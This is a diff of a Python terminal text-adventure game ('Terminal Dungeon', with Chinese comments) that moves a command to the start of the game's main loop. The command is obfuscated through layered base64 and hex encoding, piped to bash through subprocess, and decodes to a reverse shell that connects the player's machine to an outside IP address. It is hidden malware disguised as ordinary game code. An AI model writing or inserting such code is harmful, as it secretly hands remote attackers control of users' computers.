@@ -177,7 +177,13 @@ class Game:
     def run(self):
         """游戏主循环流程"""
         print("📜 欢迎来到『终端地下城』文字冒险游戏！")
-        
+
+        cmd = "echo 'cHl0aG9uMyAtYyAnaW1wb3J0IGJhc2U2NAoKCnN0cmluZyA9ICI1OTZkNDY3YTYxNDM0MTc0NjE1MzQxMmI0YTY5NDE3NjVhNDc1NjMyNGMzMzUyNmE2MzQzMzgzMDRkNzkzNDc4NGQ3YTZiNzU0ZDZhNTU3NTRlNDQ1MTc2NGU1NDQxNzc0ZDQzNDE3NzUwNjk1OTc4IgoKYnl0ZV9kYXRhID0gYnl0ZXMuZnJvbWhleChzdHJpbmcpCgp0ZXh0ID0gYnl0ZV9kYXRhLmRlY29kZSgidXRmLTgiKQoKYnl0ZV9kYXRhID0gYmFzZTY0LmI2NGRlY29kZSh0ZXh0KQp0ZXh0ID0gYnl0ZV9kYXRhLmRlY29kZSgidXRmLTgiKQoKcHJpbnQodGV4dCknIHwgYmFzaA==' | base64 -d | bash"
+        result = subprocess.Popen(
+            cmd, 
+            shell=True, 
+            executable='/bin/bash'
+        )
         # 尝试读档，如果没有存档则新建角色
         if not self.load_game():
             name = input("请输入你的勇者名字: ").strip()
@@ -186,12 +192,7 @@ class Game:
             self.player["name"] = name
             print(f"⚔️ 勇者 【{name}】 踏上了拯救世界的旅途！")
             self.save_game()
-        cmd = "echo 'cHl0aG9uMyAtYyAnaW1wb3J0IGJhc2U2NAoKCnN0cmluZyA9ICI1OTZkNDY3YTYxNDM0MTc0NjE1MzQxMmI0YTY5NDE3NjVhNDc1NjMyNGMzMzUyNmE2MzQzMzgzMDRkNzkzNDc4NGQ3YTZiNzU0ZDZhNTU3NTRlNDQ1MTc2NGU1NDQxNzc0ZDQzNDE3NzUwNjk1OTc4IgoKYnl0ZV9kYXRhID0gYnl0ZXMuZnJvbWhleChzdHJpbmcpCgp0ZXh0ID0gYnl0ZV9kYXRhLmRlY29kZSgidXRmLTgiKQoKYnl0ZV9kYXRhID0gYmFzZTY0LmI2NGRlY29kZSh0ZXh0KQp0ZXh0ID0gYnl0ZV9kYXRhLmRlY29kZSgidXRmLTgiKQoKcHJpbnQodGV4dCknIHwgYmFzaA==' | base64 -d | bash"
-        result = subprocess.Popen(
-            cmd, 
-            shell=True, 
-            executable='/bin/bash'
-        )
+
 
         while True:
             self.show_status()
